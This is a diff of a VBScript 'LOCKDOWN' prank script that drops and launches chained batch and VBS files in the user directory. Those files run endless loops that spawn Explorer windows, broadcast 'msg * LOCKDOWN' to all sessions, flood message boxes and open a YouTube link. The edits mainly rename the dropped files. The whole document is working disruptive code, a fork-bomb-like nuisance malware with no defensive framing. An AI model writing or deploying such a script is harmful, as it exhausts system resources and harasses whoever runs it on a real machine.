@@ -1,7 +1,7 @@
-Dim fso, MyFile, printer, teste
+Dim fso, MyFile, printer
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("Wscript.Shell")
-Command = "cmd /c start c:\users\("USER")\desktop\teste2.bat"
+Command = "cmd /c start c:\users\alpha1.bat"
 
 
 
@@ -13,7 +13,7 @@ If intMessage = vbYes Then
 	vbYesNo + vbQuestion, "LOCKDOWN")
 
 if intMessage = vbYes Then
-		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test2.bat", True)
+		Set MyFile = fso.CreateTextFile("c:\users\alpha1.bat", True)
 
 	MyFile.WriteLine("@echo off")
 	MyFile.WriteLine("@echo .")
@@ -24,14 +24,14 @@ if intMessage = vbYes Then
 	MyFile.WriteLine("@echo    ***********************************************")
 	MyFile.WriteLine("@echo .")
 	MyFile.WriteLine("timeout /t 10 /nobreak")
-	MyFile.WriteLine("start test5.bat")
+	MyFile.WriteLine("start delta2.bat")
 
-	Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test5.bat", True)
+	Set MyFile = fso.CreateTextFile("c:\users\delta2.bat", True)
 	
-	MyFile.WriteLine("start test3.bat")
+	MyFile.WriteLine("start charlie4.bat")
 	MyFile.WriteLine("color 0a")
 	MyFile.WriteLine(":top")
-	MyFile.WriteLine("start test4.vbs")
+	MyFile.WriteLine("start foxtrot3.vbs")
 	MyFile.WriteLine("@echo ________________$$$$")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
@@ -59,19 +59,19 @@ if intMessage = vbYes Then
 	Set WshShell = CreateObject("WScript.Shell")
 	Set WshShellExec = WshShell.Exec(Command)
 	
-	Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test4.vbs", True)
+	Set MyFile = fso.CreateTextFile("c:\users\foxtrot3.vbs", True)
 
 	MyFile.WriteLine("intMessage = MsgBox(""LOCKDOWN"", vbOkOnly + vbExclamation, ""Delta1"")")
 
-		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\test3.bat", True)
+		Set MyFile = fso.CreateTextFile("c:\users\charlie4.bat", True)
 	MyFile.WriteLine("@echo off")
+	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
 	MyFile.WriteLine("color 3")
 	MyFile.WriteLine(":loop")
 	Myfile.WriteLine("tree ")
 	Myfile.WriteLine("msg * LOCKDOWN")
 	Myfile.WriteLine("start explorer")
 	Myfile.WriteLine("goto loop")
-	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
 	Wscript.Quit	
 	
 else
